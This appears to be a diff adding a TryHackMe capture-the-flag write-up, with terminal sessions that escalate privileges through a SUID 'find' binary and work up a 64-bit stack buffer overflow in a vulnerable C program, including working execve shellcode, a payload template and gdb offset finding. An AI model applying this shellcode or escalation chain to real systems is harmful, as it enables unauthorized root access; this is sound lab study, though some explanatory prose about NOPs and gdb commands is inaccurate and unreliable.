@@ -552,3 +552,558 @@ Hint 1: RID range 1000-1003 Hint 2: The longest username has the unsecure passwo
 Read the flag.txt from des's home directory.
 Answer the questions below
 ```bash
+┌──(kali㉿kali)-[~/hackthebox]
+└─$ ssh tryhackme@10.10.248.150         
+The authenticity of host '10.10.248.150 (10.10.248.150)' can't be established.
+ED25519 key fingerprint is SHA256:uYXD5exaqJ26dg+cKFTWylivPmAYK+5Eo9B2ur/LtBc.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.248.150' (ED25519) to the list of known hosts.
+tryhackme@10.10.248.150's password: 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-74-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu Jan 19 00:25:45 UTC 2023
+
+  System load:  0.0                Processes:           92
+  Usage of /:   21.9% of 19.56GB   Users logged in:     0
+  Memory usage: 16%                IP address for eth0: 10.10.248.150
+  Swap usage:   0%
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+59 packages can be updated.
+0 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Fri Jan 17 13:24:24 2020 from 192.168.247.130
+
+tryhackme@THM_exploit:~$ find / -perm -4000 2>/dev/null | xargs ls -lah
+ls: cannot access '/home/des/bof': Permission denied
+-rwsr-xr-x 1 root   root             31K Aug 11  2016 /bin/fusermount
+-rwsr-xr-x 1 root   root             43K Oct 15  2018 /bin/mount
+-rwsr-xr-x 1 root   root             63K Jun 28  2019 /bin/ping
+-rwsr-xr-x 1 root   root             44K Mar 22  2019 /bin/su
+-rwsr-xr-x 1 root   root             27K Oct 15  2018 /bin/umount
+-rwsr-xr-x 1 root   root             40K May 15  2019 /snap/core/7270/bin/mount
+-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/7270/bin/ping
+-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/7270/bin/ping6
+-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/7270/bin/su
+-rwsr-xr-x 1 root   root             27K May 15  2019 /snap/core/7270/bin/umount
+-rwsr-xr-x 1 root   root             71K Mar 25  2019 /snap/core/7270/usr/bin/chfn
+-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/7270/usr/bin/chsh
+-rwsr-xr-x 1 root   root             74K Mar 25  2019 /snap/core/7270/usr/bin/gpasswd
+-rwsr-xr-x 1 root   root             39K Mar 25  2019 /snap/core/7270/usr/bin/newgrp
+-rwsr-xr-x 1 root   root             53K Mar 25  2019 /snap/core/7270/usr/bin/passwd
+-rwsr-xr-x 1 root   root            134K Jun 10  2019 /snap/core/7270/usr/bin/sudo
+-rwsr-xr-- 1 root   systemd-resolve  42K Jun 10  2019 /snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root   root            419K Mar  4  2019 /snap/core/7270/usr/lib/openssh/ssh-keysign
+-rwsr-sr-x 1 root   root            101K Jun 21  2019 /snap/core/7270/usr/lib/snapd/snap-confine
+-rwsr-xr-- 1 root   dip             386K Jun 12  2018 /snap/core/7270/usr/sbin/pppd
+-rwsr-xr-x 1 root   root             40K Oct 10  2019 /snap/core/8268/bin/mount
+-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/8268/bin/ping
+-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/8268/bin/ping6
+-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/8268/bin/su
+-rwsr-xr-x 1 root   root             27K Oct 10  2019 /snap/core/8268/bin/umount
+-rwsr-xr-x 1 root   root             71K Mar 25  2019 /snap/core/8268/usr/bin/chfn
+-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/8268/usr/bin/chsh
+-rwsr-xr-x 1 root   root             74K Mar 25  2019 /snap/core/8268/usr/bin/gpasswd
+-rwsr-xr-x 1 root   root             39K Mar 25  2019 /snap/core/8268/usr/bin/newgrp
+-rwsr-xr-x 1 root   root             53K Mar 25  2019 /snap/core/8268/usr/bin/passwd
+-rwsr-xr-x 1 root   root            134K Oct 11  2019 /snap/core/8268/usr/bin/sudo
+-rwsr-xr-- 1 root   systemd-resolve  42K Jun 10  2019 /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root   root            419K Mar  4  2019 /snap/core/8268/usr/lib/openssh/ssh-keysign
+-rwsr-sr-x 1 root   root            105K Dec  6  2019 /snap/core/8268/usr/lib/snapd/snap-confine
+-rwsr-xr-- 1 root   dip             386K Jun 12  2018 /snap/core/8268/usr/sbin/pppd
+-rwsr-sr-x 1 daemon daemon           51K Feb 20  2018 /usr/bin/at
+-rwsr-xr-x 1 root   root             75K Mar 22  2019 /usr/bin/chfn
+-rwsr-xr-x 1 root   root             44K Mar 22  2019 /usr/bin/chsh
+-rwsr-sr-x 1 des    des             233K Nov  5  2017 /usr/bin/find
+-rwsr-xr-x 1 root   root             75K Mar 22  2019 /usr/bin/gpasswd
+-rwsr-xr-x 1 root   root             37K Mar 22  2019 /usr/bin/newgidmap
+-rwsr-xr-x 1 root   root             40K Mar 22  2019 /usr/bin/newgrp
+-rwsr-xr-x 1 root   root             37K Mar 22  2019 /usr/bin/newuidmap
+-rwsr-xr-x 1 root   root             59K Mar 22  2019 /usr/bin/passwd
+-rwsr-xr-x 1 root   root             22K Mar 27  2019 /usr/bin/pkexec
+-rwsr-xr-x 1 root   root            146K Oct 10  2019 /usr/bin/sudo
+-rwsr-xr-x 1 root   root             19K Jun 28  2019 /usr/bin/traceroute6.iputils
+-rwsr-xr-- 1 root   messagebus       42K Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root   root             10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root   root            427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root   root             14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-sr-x 1 root   root            103K Jun  5  2019 /usr/lib/snapd/snap-confine
+-rwsr-xr-x 1 root   root             99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+
+Horizontal escalation
+
+tryhackme@THM_exploit:~$ find . -exec /bin/sh -p \; -quit
+```
+```bash
+$ whoami
+des
+```
+```bash
+$ cd /home/des
+```
+```bash
+$ ls
+bof  bof64.c  flag.txt
+```
+```bash
+$ cat flag.txt
+Good job on exploiting the SUID file. Never assign +s to any system executable files. Remember, Check gtfobins.
+
+You flag is THM{exploit_the_SUID}
+
+login crdential (In case you need it)
+username: des
+password: destructive_72656275696c64
+```
+```bash
+$ cat bof64.c
+#include <stdio.h>
+#include <unistd.h>
+
+int foo(){
+	char buffer[600];
+	int characters_read;
+	printf("Enter some string:\n");
+	characters_read = read(0, buffer, 1000);
+	printf("You entered: %s", buffer);
+	return 0;
+}
+
+void main(){
+	setresuid(geteuid(), geteuid(), geteuid());
+    	setresgid(getegid(), getegid(), getegid());
+
+	foo();
+}
+```
+```bash
+$ ls -lah
+total 52K
+drwx------ 4 des  des  4.0K Jan 17  2020 .
+drwxr-xr-x 6 root root 4.0K Jan 17  2020 ..
+-rw------- 1 root root 1.7K Jan 12  2020 .bash_history
+-rw-r--r-- 1 des  des   220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 des  des  3.7K Apr  4  2018 .bashrc
+-rwsr-xr-x 1 kel  kel  8.4K Jan 17  2020 bof
+-rw-r--r-- 1 root root  335 Jan 17  2020 bof64.c
+drwx------ 2 des  des  4.0K Jan 12  2020 .cache
+-r-x------ 1 des  des   237 Jan 17  2020 flag.txt
+drwx------ 3 des  des  4.0K Jan 12  2020 .gnupg
+-rw-r--r-- 1 des  des   807 Apr  4  2018 .profile
+
+kel (horizontal escalation)
+
+ssh
+
+des:destructive_72656275696c64
+```
+**[+100 Points]** What is the contents of /home/des/flag.txt?
+File permission is all you need.. Setuid...
+### Buffer Overflow :: Binary 2
+Read the flag.txt from kel's home directory.
+If you are stuck, here are the hints for the exploit.
+**Hint 1: Step to overflow 64-bits buffer**
+**Step 1**: Generate a pattern, copy and paste this as input to the binary (use pattern_create.rb from
+Metasploit)
+**
+**Step 2**: Read and copy the value from register RBP for the offset.
+****
+**Step 3**: Calculate the offset. (use pattern_offset.rb from Metasploit)
+****
+**Step 4**: Try control the register RIP with the following payload
+**
+Junk*(offset value) + 8 bytes of dummy
+**Step 5**: Read the stack or register RSP to find a suitable return address.
+**
+**Step 6**: The general payload should be like below
+**
+Nop + shellcode + Junks + return address
+**Hint 2: Working shellcode**
+`\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05`
+**Hint 3: Running the payload with the binary**
+`(python -c "print('\x90'*(fill in the number) + (shellcode) + 'A'*(fill in the number)`
+`+(return address))";cat) | ./bof64`
+For your information, the Gnu debugger or gdb is installed with the machine. Happy hunting!
+Answer the questions below
+```yml
+
+```
+```yml
+┌──(kali㉿kali)-[~/Downloads]
+└─$ ssh des@10.10.248.150               
+des@10.10.248.150's password: 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-74-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu Jan 19 01:10:20 UTC 2023
+
+  System load:  0.0                Processes:           99
+  Usage of /:   22.0% of 19.56GB   Users logged in:     1
+  Memory usage: 35%                IP address for eth0: 10.10.248.150
+  Swap usage:   0%
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+59 packages can be updated.
+0 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Fri Jan 17 13:29:39 2020 from 192.168.247.130
+des@THM_exploit:~$ ls
+bof  bof64.c  flag.txt
+des@THM_exploit:~$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.8.19.103 - - [19/Jan/2023 01:12:21] "GET /bof64.c HTTP/1.1" 200 -
+10.8.19.103 - - [19/Jan/2023 01:12:28] "GET /bof HTTP/1.1" 200 -
+```
+```yml
+┌──(kali㉿kali)-[~/binex]
+└─$ wget http://10.10.248.150:8000/bof64.c
+--2023-01-18 20:12:20--  http://10.10.248.150:8000/bof64.c
+Connecting to 10.10.248.150:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 335 [text/plain]
+Saving to: ‘bof64.c’
+
+bof64.c      100%     335  --.-KB/s    in 0s       
+
+2023-01-18 20:12:21 (15.4 MB/s) - ‘bof64.c’ saved [335/335]
+```
+```yml
+┌──(kali㉿kali)-[~/binex]
+└─$ wget http://10.10.248.150:8000/bof    
+--2023-01-18 20:12:28--  http://10.10.248.150:8000/bof
+Connecting to 10.10.248.150:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 8600 (8.4K) [application/octet-stream]
+Saving to: ‘bof’
+
+bof          100%   8.40K  --.-KB/s    in 0.001s   
+
+2023-01-18 20:12:28 (12.2 MB/s) - ‘bof’ saved [8600/8600]
+
+──(kali㉿kali)-[~/binex]
+└─$ cat bof64.c 
+#include <stdio.h>
+#include <unistd.h>
+
+int foo(){
+	char buffer[600];
+	int characters_read;
+	printf("Enter some string:\n");
+	characters_read = read(0, buffer, 1000);
+	printf("You entered: %s", buffer);
+	return 0;
+}
+
+void main(){
+	setresuid(geteuid(), geteuid(), geteuid());
+    	setresgid(getegid(), getegid(), getegid());
+
+	foo();
+}
+
+This is a simple C program that uses the function read() to read input from the user and stores it in a buffer of size 600 bytes. The program then prints out the input that the user entered. The problem with this program is that the buffer size is too small and the input that the user enters is not properly validated. This means that if a user enters more than 600 bytes of data, it will overwrite memory outside of the buffer and cause a buffer overflow. This can potentially lead to security vulnerabilities and can be exploited by malicious actors to gain unauthorized access to the system or execute arbitrary code.
+
+The setresuid() and setresgid() functions in the main method are used to set the real, effective, and saved user and group IDs to the effective user and group IDs. This is not related to the buffer overflow issue.
+```
+```yml
+┌──(kali㉿kali)-[~/binex]
+└─$ chmod +x bof
+```
+```yml
+┌──(kali㉿kali)-[~/binex]
+└─$ ./bof           
+Enter some string:
+hi
+You entered: hi
+f
+```
+```yml
+┌──(kali㉿kali)-[~]
+└─$ export PATH=/home/kali/.local/bin:$PATH
+
+The command sets the PATH variable to "/home/kali/.local/bin:$PATH". This means that the shell will first look for executables in the directory /home/kali/.local/bin and then in the directories listed in the current value of the PATH variable.
+
+The .local/bin directory is a common location for locally-installed executables, so this command is likely being used to ensure that locally-installed executables are found before system-wide executables.
+```
+```yml
+┌──(kali㉿kali)-[~]
+└─$ cyclic 650  
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagma
+```
+```yml
+┌──(kali㉿kali)-[~]
+└─$ python3
+Python 3.10.9 (main, Dec  7 2022, 13:47:07) [GCC 12.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> print('a'*650)
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+```
+```yml
+┌──(kali㉿kali)-[~/binex]
+└─$ ./bof  
+Enter some string:
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+zsh: segmentation fault  ./bof
+```
+```yml
+┌──(kali㉿kali)-[~/binex]
+└─$ lscpu | ./bof
+Enter some string:
+You entered: Architecture:                    x86_64
+CPU op-mode(s):                  32-bit, 64-bit
+Address sizes:                   40 bits physical, 48 bits virtual
+Byte Order:                      Little Endian
+CPU(s):                          4
+On-line CPU(s) list:             0-3
+Vendor ID:                       GenuineIntel
+Model name:                      Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz
+CPU family:                      6
+Model:                           142
+Thread(s) per core:              1
+Core(s) per socket:              2
+Socket(s):                       2
+zsh: done                lscpu | 
+zsh: segmentation fault  ./bof
+```
+```yml
+┌──(kali㉿kali)-[~/binex]
+└─$ gdb bof
+GNU gdb (Debian 12.1-4) 12.1
+Copyright (C) 2022 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<https://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+pwndbg: loaded 142 pwndbg commands and 48 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
+pwndbg: created $rebase, $ida GDB functions (can be used with print/break)
+Reading symbols from bof...
+(No debugging symbols found in bof)
+------- tip of the day (disable with set show-tips off) -------
+Use the canary command to see all stack canary/cookie values on the stack (based on the *usual* stack canary value initialized by glibc)
+pwndbg> r < <(cyclic 650)
+Starting program: /home/kali/binex/bof < <(cyclic 650)
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Enter some string:
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000055555540084e in foo ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+─────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────
+ RAX  0x0
+*RBX  0x3e8
+ RCX  0x0
+ RDX  0x0
+*RDI  0x7fffffffda30 —▸ 0x7ffff7e12e70 (funlockfile) ◂— mov rdi, qword ptr [rdi + 0x88]
+*RSI  0x555555400956 ◂— add byte ptr [rax], al
+ R8   0x0
+*R9   0x73
+ R10  0x0
+*R11  0xffffffff
+*R12  0x3e8
+*R13  0x7fffffffe338 —▸ 0x7fffffffe5d6 ◂— 'COLORTERM=truecolor'
+ R14  0x0
+*R15  0x7ffff7ffd020 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555400000 ◂— jg 0x555555400047
+*RBP  0x6761616467616163 ('caagdaag')
+*RSP  0x7fffffffe1f8 ◂— 0x6761616667616165 ('eaagfaag')
+*RIP  0x55555540084e (foo+84) ◂— ret 
+──────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────
+ ► 0x55555540084e <foo+84>    ret    <0x6761616667616165>
+
+────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7fffffffe1f8 ◂— 0x6761616667616165 ('eaagfaag')
+01:0008│     0x7fffffffe200 ◂— 0x6761616867616167 ('gaaghaag')
+02:0010│     0x7fffffffe208 ◂— 0x6761616a67616169 ('iaagjaag')
+03:0018│     0x7fffffffe210 ◂— 0x6761616c6761616b ('kaaglaag')
+04:0020│     0x7fffffffe218 —▸ 0x7ffff7de616d ◂— 0x9c370000000
+05:0028│     0x7fffffffe220 ◂— 0x0
+06:0030│     0x7fffffffe228 —▸ 0x55555540084f (main) ◂— push rbp
+07:0038│     0x7fffffffe230 ◂— 0x100000000
+──────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────
+ ► f 0   0x55555540084e foo+84
+   f 1 0x6761616667616165
+   f 2 0x6761616867616167
+   f 3 0x6761616a67616169
+   f 4 0x6761616c6761616b
+   f 5   0x7ffff7de616d
+   f 6              0x0
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> disassemble shell
+No symbol "shell" in current context.
+pwndbg> disassemble special
+No symbol "special" in current context.
+pwndbg> disassemble shell
+No symbol "shell" in current context.
+pwndbg> exit
+
+uhmm let's do it another way
+
+des@THM_exploit:~$ gdb bof
+GNU gdb (Ubuntu 8.1-0ubuntu3.2) 8.1.0.20180409-git
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from bof...(no debugging symbols found)...done.
+
+(gdb) r < <(python -c 'print("A" * 660)')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/des/bof < <(python -c 'print("A" * 660)')
+Enter some string:
+Program received signal SIGSEGV, Segmentation fault.
+0x000055555555484e in foo ()
+(gdb) i r
+rax            0x0	0
+rbx            0x3e9	1001
+rcx            0x0	0
+rdx            0x0	0
+rsi            0x555555554956	93824992233814
+rdi            0x7ffff7dd0760	140737351845728
+rbp            0x4141414141414141	0x4141414141414141
+rsp            0x7fffffffe498	0x7fffffffe498
+r8             0xffffffffffffffed	-19
+r9             0x25e	606
+r10            0x5555557564cb	93824994337995
+r11            0x555555554956	93824992233814
+r12            0x3e9	1001
+r13            0x7fffffffe590	140737488348560
+r14            0x0	0
+r15            0x0	0
+rip            0x55555555484e	0x55555555484e <foo+84>
+eflags         0x10206	[ PF IF RF ]
+cs             0x33	51
+ss             0x2b	43
+ds             0x0	0
+es             0x0	0
+fs             0x0	0
+gs             0x0	0
+(gdb) 
+
+(gdb) x/xg $rsp
+0x7fffffffe498:	0x4141414141414141
+
+https://medium.com/@buff3r/basic-buffer-overflow-on-64-bit-architecture-3fb74bab3558
+```
+```yml
+┌──(kali㉿kali)-[~]
+└─$ cyclic 650
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagma
+
+des@THM_exploit:~$ gdb bof
+GNU gdb (Ubuntu 8.1-0ubuntu3.2) 8.1.0.20180409-git
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from bof...(no debugging symbols found)...done.
+(gdb) run
+Starting program: /home/des/bof 
+Enter some string:
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagma
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000055555555484e in foo ()
+(gdb) i r
+rax            0x0	0
+rbx            0x3e9	1001
+rcx            0x0	0
+rdx            0x0	0
+rsi            0x555555554956	93824992233814
+rdi            0x7ffff7dd0760	140737351845728
+rbp            0x6761616467616163	0x6761616467616163
+rsp            0x7fffffffe498	0x7fffffffe498
+r8             0xffffffffffffffed	-19
+r9             0x25e	606
+r10            0x5555557564cb	93824994337995
+r11            0x555555554956	93824992233814
+r12            0x3e9	1001
+r13            0x7fffffffe590	140737488348560
+r14            0x0	0
+r15            0x0	0
+rip            0x55555555484e	0x55555555484e <foo+84>
+eflags         0x10206	[ PF IF RF ]
+cs             0x33	51
+ss             0x2b	43
+ds             0x0	0
+es             0x0	0
+fs             0x0	0
+gs             0x0	0
+(gdb) x/xg $rsp
+0x7fffffffe498:	0x6761616667616165
+```
+```yml
+┌──(kali㉿kali)-[~/binex]
+└─$ cyclic -l 0x6761616667616165
+616
+
+This gives us an offset of 616
+
+RSP (Register Stack Pointer) and RIP (Register Instruction Pointer) are registers in the x86-64 architecture used by the CPU to store memory addresses. RSP points to the top of the stack and is used to keep track of where the next item will be pushed or popped from the stack. RIP, on the other hand, points to the next instruction to be executed by the CPU.
+
+NOP (No Operation) is a machine language instruction that does nothing. It is commonly used in assembly language programming as a "padding" instruction or as a "placeholder" instruction to fill space between other instructions. In GDB, it is used to skip instructions when debugging and testing an assembly code.
+
+In GDB, you can use the command "x/i $rip" to examine the instruction pointed to by the RIP register, and "x/i $rsp" to examine the instruction pointed to by the RSP register.
+
+It's also important to mention that RSP and RIP are x86_64 architecture registers, therefore, depending on the architecture you are using, the registers may be different.
+
+The command "r < <(python -c 'print("A" * 660)')" in GDB is an attempt to run the program being debugged with an input stream coming from a subshell, which is a shell command that runs in a new process. In this case, the subshell is executing a python script that creates a string of 660 'A' characters and prints it. This string is passed as input to the program being debugged when the "r" command is run.
+
+This command is likely attempting to exploit a buffer overflow vulnerability in the program being debugged by providing more input data than the program can handle. The goal is likely to overwrite the return address of the function with an address that points to the shellcode.
+
+The command "i r" in GDB is short for "info registers". This command displays the current values of all the registers in the CPU. The registers that are displayed will depend on the architecture of the system, but for x86-64 architecture, it will display the general-purpose registers (eax, ebx, ecx, edx, etc.), the instruction pointer (rip), the stack pointer (rsp), and the flags register (eflags). The values displayed in these registers will change as the program is executed, and they can be useful for understanding the current state of the program and for debugging.
+
+It's also important to mention that GDB is a powerful tool for debugging and analyzing code, but it is not a toy, and it should be used by those who have knowledge of its commands and their usage.
+
+The command "x/xg $rsp" in GDB is used to examine the memory at the address stored in the register RSP (Stack Pointer) in x86-64 architecture.
+
+The "x" command in GDB is used to examine memory. The "/xg" part of the command is a format specifier, it tells GDB to display the memory contents in hexadecimal format and the "g" specifies that the data size should be 8 bytes (x86-64 architecture). The "$rsp" part of the command specifies the memory address to be examined, in this case, the content of the RSP register.
+
+This command is useful for examining the top of the stack, which can be useful for debugging and understanding the current state of the program. However, it is important to have a good understanding of the program's memory layout, or the output of this command might not be meaningful.
+
+The command "x/616xb $rsp - 620" in GDB is used to examine the memory at the address stored in the register RSP (Stack Pointer) minus 620 in x86-64 architecture.
